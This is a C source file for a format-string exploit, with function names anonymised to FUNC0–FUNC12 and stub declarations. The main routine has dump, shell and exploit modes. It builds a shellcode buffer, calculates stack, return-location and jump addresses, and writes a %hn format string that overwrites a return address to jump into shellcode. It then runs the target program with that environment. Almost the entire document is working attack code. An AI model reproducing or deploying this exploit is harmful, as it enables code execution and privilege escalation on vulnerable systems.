#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int ALIGN ; 
 int NUM ; 
 int PATTERN ; 
 int RETLOC ; 
 int RETLOCOFS ; 
 int SHELL ; 
 int SHELLOFS ; 
 int /*<<< orphan*/  SI_PLATFORM ; 
 char* VULPROG ; 
 int /*<<< orphan*/  FUNC0 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*) ; 
 int FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 int /*<<< orphan*/  FUNC5 (char*,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,...) ; 
 scalar_t__ FUNC7 (char*,char*,int*) ; 
 int FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 

FUNC12(int argc, char **argv)
{
    char shellbuf[SHELL], pattern[PATTERN], platform[256];
    char *ptr;
    long sp_addr, sh_addr, jmp_addr, reth, retl;
    int num = NUM, align = ALIGN, shellofs = SHELLOFS, retlocofs = RETLOCOFS, retloc = RETLOC;
    int i;

    int dump = 0, shell = 0, exploit = 0;

    /* read the exploit arguments */

    if (argc < 2) {
        FUNC11(argv[0]);
    }

    if (!FUNC9(argv[1], "dump", 4)) { dump = 1; }
    else if(!FUNC9(argv[1], "shell", 5)) { shell = 1; }
    else if(!FUNC9(argv[1], "exploit", 7)) { exploit = 1; }
    else {
        FUNC11(argv[0]);
    }

    for (i = 2; i < argc; i++) {
        if ( (FUNC7(argv[i], "--align=%d", &align) ||
              FUNC7(argv[i], "--num=%d", &num) ||
              FUNC7(argv[i], "--shellofs=%d", &shellofs) ||
              FUNC7(argv[i], "--retlocofs=%d", &retlocofs) ||
              FUNC7(argv[i], "--retloc=%x", &retloc))== 0) {
                FUNC4("Unrecognized option %s\n\n", argv[i]);
                FUNC11(argv[0]);
            }
    }

    /* create the shell buffer */

    FUNC0(shellbuf, align, retloc);

    /* calculate memory addresses */

    FUNC10(SI_PLATFORM, platform, 256);            /* get platform info  */

    sp_addr = (FUNC2() | 0xffff) & 0xfffffffc;     /* get stack bottom address */
    sh_addr = sp_addr - (FUNC8(VULPROG)+1) - (FUNC8(platform)+1) - (FUNC8(shellbuf)+1) + shellofs;

    /* sh_add now points to the beginning of the shell buffer */

    FUNC4("Calculated shell buffer address: 0x%x\n", sh_addr);

    if (shell == 1) {
        FUNC5(&shellbuf[align], sh_addr);        /* put sh_addr on the stack */
    }

    if ( ((sh_addr + align) & 0xfffffffc) != (sh_addr + align) ) {
        FUNC4("Warning: sh_addr + align must be word aligned. Adjust shellofs and align as neccessary\n");
    }

    if (retloc == RETLOC) {                         /* if retloc was not specified on the command line, calculate it */
        retloc = sh_addr + align - num*4 + retlocofs;
        FUNC4("Calculated retloc: 0x%x\n", retloc);

        FUNC5(&shellbuf[align+4], retloc);
        FUNC5(&shellbuf[align+12], retloc+2);
    }

    jmp_addr = (sh_addr + align) + 64;              /* Calculate the shell jump location */
    FUNC4("Calculated shell code jump location: 0x%x\n\n", jmp_addr);

    /* create the format string */

    ptr = pattern;
    for (i = 0; i < num; i++) {
        FUNC3(ptr, "%.8x", 4);
        ptr = ptr + 4;
    }

    if (dump == 1) {
        *ptr = 0;                                   /* null-terminate */
        FUNC4("Stack dump mode, dumping %d words\n", num);
    }
    else if (shell == 1) {
        FUNC6(ptr, " Shell buffer: %%s");

        FUNC4("shellbuf (length = %d): %s\n\n", FUNC8(shellbuf)+1, shellbuf);
        FUNC4("Shell buffer dump mode, shell buffer address is 0x%x\n", sh_addr);
    }
    else {
        reth = (jmp_addr >> 16) & 0xffff;
        retl = (jmp_addr >> 0) & 0xffff;

        FUNC6(ptr, "%%%uc%%hn%%%uc%%hn", (reth - num * 8), (retl - reth));
        FUNC4("Exploit mode, jumping to 0x%x\n", jmp_addr);
    }

    FUNC4("num: %d\t\talign: %d\tshellofs: %d\tretlocofs: %d\tretloc: 0x%x\n\n",
            num, align, shellofs, retlocofs, retloc);

    /* execute the vulnerable program using our custom environment */

    FUNC1(pattern, shellbuf);

}